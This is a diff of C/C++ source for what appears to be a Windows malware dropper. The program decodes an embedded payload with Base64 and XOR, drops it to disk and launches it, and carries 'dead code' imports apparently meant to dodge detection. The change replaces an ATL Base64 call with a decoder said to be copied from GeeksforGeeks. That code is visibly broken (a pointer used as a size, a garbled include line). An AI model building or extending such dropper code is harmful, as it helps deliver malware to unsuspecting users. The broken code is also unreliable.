@@ -10,13 +10,15 @@
 #include<windows.h>		// Resource Management
 #include"resource.h"	// Resources Definition
 #include<time.h>		// rand seed
+#include<map>
+#include <bits/stdc++.h>
 
 // Imports for the dead code function
 #include<commctrl.h>
 #include<shlobj.h>>t.h>
 #include<uxtheme.h>
 // #include<atlstr.h>
-#include<atlenc.h>
+// #include<atlenc.h>
 
 // Linking with teh dead imports
 #pragma comment(lib, "Comctl32.lib")
@@ -77,7 +79,7 @@ int main(int argc, char* argv[])
 	// where to drop
 	set_name();
 	// Drop to Disk
-	// 
+	//
 	drop(size, data);
 
 	// process
@@ -128,22 +130,91 @@ void launch()
 #endif
 }
 
-// Decode a Base64 String
+// Decode a Base64 String copied from geeks for geeks
 void* base64decode(void* data, DWORD* size)
 {
-	// original string size
-	int original_size = strlen((char*)data);
-	// number of bytes after decoded
-	int decoded_size = Base64DecodeGetRequiredLength(original_size);
-	// temporary buffer to store the decoded bytes
-	void* buffer2 = malloc(decoded_size);
-	// decoded
-	Base64Decode((PCSTR)data, original_size, (BYTE*)buffer2, &decoded_size);
-	// return new buffer size
-	*size = decoded_size;
-	// return new buffer
-	return buffer2;
-	// old buffer is lost (without freeing, sorry)
+
+    char* decoded_string;
+
+    decoded_string = (char*)malloc(size);
+
+    char* string_data = (void*) data;
+
+    int i, j, k = 0;
+
+    // stores the bitstream.
+    int num = 0;
+
+    // count_bits stores current
+    // number of bits in num.
+    int count_bits = 0;
+
+    // selects 4 characters from
+    // encoded string at a time.
+    // find the position of each encoded
+    // character in char_set and stores in num.
+    for (i = 0; i < (int) size; i += 4)
+    {
+        num = 0, count_bits = 0;
+        for (j = 0; j < 4; j++)
+        {
+
+            // make space for 6 bits.
+            if (string_data[i + j] != '=')
+            {
+                num = num << 6;
+                count_bits += 6;
+            }
+
+            /* Finding the position of each encoded 
+            character in char_set 
+            and storing in "num", use OR 
+            '|' operator to store bits.*/
+
+            // encoded[i + j] = 'E', 'E' - 'A' = 5
+            // 'E' has 5th position in char_set.
+            if (string_data[i + j] >= 'A' && string_data[i + j] <= 'Z')
+                num = num | (string_data[i + j] - 'A');
+
+            // encoded[i + j] = 'e', 'e' - 'a' = 5,
+            // 5 + 26 = 31, 'e' has 31st position in char_set.
+            else if (string_data[i + j] >= 'a' && string_data[i + j] <= 'z')
+                num = num | (string_data[i + j] - 'a' + 26);
+
+            // encoded[i + j] = '8', '8' - '0' = 8
+            // 8 + 52 = 60, '8' has 60th position in char_set.
+            else if (string_data[i + j] >= '0' && string_data[i + j] <= '9')
+                num = num | (string_data[i + j] - '0' + 52);
+
+            // '+' occurs in 62nd position in char_set.
+            else if (string_data[i + j] == '+')
+                num = num | 62;
+
+            // '/' occurs in 63rd position in char_set.
+            else if (string_data[i + j] == '/')
+                num = num | 63;
+
+            // ( str[i + j] == '=' ) remove 2 bits
+            // to delete appended bits during encoding.
+            else {
+                num = num >> 2;
+                count_bits -= 2;
+            }
+        }
+
+        while (count_bits != 0)
+        {
+            count_bits -= 8;
+
+            // 255 in binary is 11111111
+            decoded_string[k++] = (num >> count_bits) & 255;
+        }
+    }
+
+    // place NULL character to mark end of string.
+    decoded_string[k] = '\0';
+
+    return decoded_string;
 }
 
 // XOR bytes in the buffer with a key
